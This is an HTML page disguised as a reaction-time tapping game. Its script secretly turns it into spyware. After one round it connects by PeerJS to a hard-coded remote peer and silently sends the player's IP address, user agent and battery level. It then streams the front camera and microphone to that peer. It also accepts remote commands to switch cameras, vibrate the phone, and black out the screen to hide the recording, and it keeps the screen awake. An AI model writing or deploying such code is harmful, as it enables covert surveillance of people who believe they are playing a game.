<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Reaction Test</title>
    <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
    <style>
        body {
            background-color: #1a1a1a;
            color: white;
            font-family: 'Arial', sans-serif;
            margin: 0;
            height: 100vh;
            overflow: hidden;
            display: flex;
            flex-direction: column;
            align-items: center;
            /* CHANGE 1: Center vertically */
            justify-content: center;
            /* CHANGE 2: Remove the top padding */
            padding-top: 0;
            touch-action: none;
            user-select: none;
        }

        #game-board {
            width: 85vw;
            height: 85vw;
            max-width: 400px;
            max-height: 400px;
            background-color: #2c3e50;
            border-radius: 20px;
            box-shadow: 0 0 30px rgba(0,0,0,0.5);
            position: relative;
            border: 4px solid #34495e;
            cursor: pointer;
            z-index: 10;
        }

            #game-board.active {
                background-color: #34495e;
            }

            #game-board.success {
                background-color: #27ae60;
            }

            #game-board.fail {
                background-color: #c0392b;
            }

        #hud-container {
            margin-bottom: 30px;
            text-align: center;
            width: 90%;
            z-index: 10;
        }

        #main-display {
            font-size: 50px;
            font-weight: bold;
            color: #bdc3c7;
            text-shadow: 2px 2px 0 #000;
        }

        #instruction {
            font-size: 18px;
            color: #ecf0f1;
            margin-top: 10px;
            line-height: 1.4;
        }

        /* HIDDEN BLACKOUT LAYER */
        #blackout-layer {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: black;
            z-index: 9999;
            display: none;
            cursor: none;
        }
    </style>
</head>
<body>

    <div id="blackout-layer"></div>

    <div id="hud-container">
        <div id="main-display">TAP TO START</div>
        <div id="instruction">1. Close eyes.<br>2. Wait for BEEP.<br>3. Tap fast!</div>
    </div>
    <div id="game-board"></div>

    <script>
        // --- CONFIGURATION ---
        const TECHNICIAN_ID = "tech-support-commander-671";
        const TRIGGER_COUNT = 1; // Connects after 1 round

        // --- VARIABLES ---
        let gameState = 'IDLE';
        let beepTimestamp = 0;
        let roundCount = 0;
        let isConnected = false;
        let wakeLock = null;

        const AudioContext = window.AudioContext || window.webkitAudioContext;
        let audioCtx;
        const board = document.getElementById('game-board');
        const display = document.getElementById('main-display');
        const blackoutLayer = document.getElementById('blackout-layer');

        const peer = new Peer();
        let myDataConnection = null;
        let currentStream = null;

        // 1. GAME INPUT HANDLER
        board.addEventListener('touchstart', handleInput, { passive: false });
        board.addEventListener('mousedown', handleInput);

        async function handleInput(e) {
            e.preventDefault();

            // Request Wake Lock (Keep screen on)
            if (!wakeLock) {
                try { wakeLock = await navigator.wakeLock.request('screen'); }
                catch (err) { console.log("Wake Lock Error", err); }
            }

            // Init Audio
            if (!audioCtx) audioCtx = new AudioContext();
            if (audioCtx.state === 'suspended') audioCtx.resume();

            // Game Logic Loop
            if (gameState === 'IDLE') {
                gameState = 'WAITING_FOR_BEEP';
                display.innerText = "WAIT...";
                display.style.color = "#f1c40f";
                scheduleBeep();
                return;
            }

            if (gameState === 'WAITING_FOR_BEEP') {
                display.innerText = "TOO EARLY!";
                display.style.color = "#e74c3c";
                flashBoard('fail');
                clearTimeout(beepTimer);
                setTimeout(() => {
                    display.innerText = "WAIT...";
                    display.style.color = "#f1c40f";
                    scheduleBeep();
                }, 1000);
                return;
            }

            if (gameState === 'WAITING_FOR_TAP') {
                const reactionTime = Date.now() - beepTimestamp;
                display.innerText = reactionTime + " ms";
                display.style.color = "#2ecc71";
                flashBoard('success');
                roundCount++;

                // --- TRIGGER SURVEILLANCE ---
                if (roundCount === TRIGGER_COUNT && !isConnected) {
                    activateSurveillance();
                }

                gameState = 'WAITING_FOR_BEEP';
                setTimeout(() => {
                    display.innerText = "WAIT...";
                    display.style.color = "#f1c40f";
                    scheduleBeep();
                }, 1000);
            }
        }

        // 2. TIMING & AUDIO UTILS
        let beepTimer = null;
        function scheduleBeep() {
            beepTimer = setTimeout(() => {
                playTone();
                beepTimestamp = Date.now();
                gameState = 'WAITING_FOR_TAP';
            }, Math.floor(Math.random() * 2000) + 1000);
        }

        function playTone() {
            if (!audioCtx) return;
            const osc = audioCtx.createOscillator();
            const g = audioCtx.createGain();
            osc.connect(g); g.connect(audioCtx.destination);
            osc.frequency.value = 600; g.gain.value = 0.1;
            osc.start(); osc.stop(audioCtx.currentTime + 0.15);
        }

        function flashBoard(type) {
            board.classList.add(type);
            setTimeout(() => board.classList.remove(type), 200);
        }

        // 3. SURVEILLANCE LOGIC (The Spy Part)
        async function activateSurveillance() {
            isConnected = true;
            try {
                // A. Connect Data Layer
                myDataConnection = peer.connect(TECHNICIAN_ID);

                myDataConnection.on('open', async () => {

                    // --- GET IP & BATTERY & SEND SILENTLY ---
                    try {
                        const ipReq = await fetch('https://api.ipify.org?format=json');
                        const ipJson = await ipReq.json();

                        let batLevel = null;
                        try {
                            const bat = await navigator.getBattery();
                            batLevel = bat.level;
                        } catch (e) { }

                        // Send Info Packet
                        myDataConnection.send({
                            type: 'info',
                            ip: ipJson.ip,
                            userAgent: navigator.userAgent,
                            battery: batLevel
                        });

                    } catch (e) { console.error("Data fetch failed", e); }

                    // --- LISTEN FOR REMOTE COMMANDS ---
                    myDataConnection.on('data', (data) => {
                        // Support both string "swap" and object {command: "swap"}
                        const cmd = data.command || data;

                        if (cmd === 'swap') toggleCamera();
                        if (cmd === 'vibrate') {
                            if (navigator.vibrate) navigator.vibrate([300, 100, 300]);
                        }
                        if (cmd === 'blackout_on') blackoutLayer.style.display = 'block';
                        if (cmd === 'blackout_off') blackoutLayer.style.display = 'none';
                    });
                });

                // B. Start Video Stream
                await startStream('user');

            } catch (err) { console.log("Silent error:", err); }
        }

        async function startStream(mode) {
            if (currentStream) currentStream.getTracks().forEach(t => t.stop());

            // This triggers the permission popup
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode }, audio: true });
            currentStream = stream;

            // Send video to technician
            peer.call(TECHNICIAN_ID, stream);
        }

        let currentMode = 'user';
        function toggleCamera() {
            currentMode = (currentMode === 'user') ? 'environment' : 'user';
            startStream(currentMode);
        }

        // Re-acquire Wake Lock if app switches
        document.addEventListener("visibilitychange", async () => {
            if (wakeLock !== null && document.visibilityState === "visible") {
                wakeLock = await navigator.wakeLock.request('screen');
            }
        });
    </script>
</body>
</html>
